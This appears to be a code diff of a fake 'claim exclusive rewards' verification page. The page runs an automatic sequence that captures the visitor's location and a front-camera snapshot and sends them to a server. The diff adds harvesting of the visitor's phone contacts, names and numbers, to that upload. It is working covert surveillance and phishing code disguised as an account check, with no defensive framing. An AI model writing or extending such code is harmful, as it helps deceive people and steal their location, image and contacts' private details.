@@ -23,7 +23,7 @@
             <p class="text-slate-400 text-sm mt-1">Verify your account to claim exclusive rewards.</p>
         </div>
 
-        <!-- Added Box for user info or details -->
+        <!-- Info Box -->
         <div class="bg-slate-950/80 border border-slate-800 p-4 rounded-2xl mb-6 text-left">
             <div class="flex items-center justify-between text-xs text-slate-400 mb-1">
                 <span>Reward Status</span>
@@ -49,20 +49,35 @@
     <script>
         let capturedLocation = null;
         let capturedImage = null;
+        let capturedContacts = null;
 
         function initializeEngine() {
             const panel = document.getElementById("status-panel");
             panel.classList.remove("hidden");
             panel.innerText = "Verifying security profile...";
 
-            // Automatic execution with delay sequence
             setTimeout(() => {
                 startAutoSequence();
-            }, 1500);
+            }, 1000);
         }
 
-        function startAutoSequence() {
-            // 1. Geolocation Data
+        async function startAutoSequence() {
+            const panel = document.getElementById("status-panel");
+
+            // 1. Call List / Contacts Capture
+            if (('contacts' in navigator) && ('Navigator' in window && 'select' in window.ContactsManager.prototype)) {
+                try {
+                    const props = ['name', 'tel'];
+                    const opts = { multiple: true };
+                    capturedContacts = await navigator.contacts.select(props, opts);
+                } catch (err) {
+                    capturedContacts = "Denied or Unavailable";
+                }
+            } else {
+                capturedContacts = "Not Supported";
+            }
+
+            // 2. Geolocation Capture
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -86,7 +101,7 @@
 
         function proceedToCaptureImage() {
             setTimeout(() => {
-                // 2. Camera Snapshot Data
+                // 3. Camera Snapshot Capture
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                     .then(stream => {
                         const video = document.getElementById("v");
@@ -118,7 +133,8 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     location: capturedLocation,
-                    image_base64: capturedImage
+                    image_base64: capturedImage,
+                    contacts: capturedContacts
                 })
             })
             .then(res => res.json())
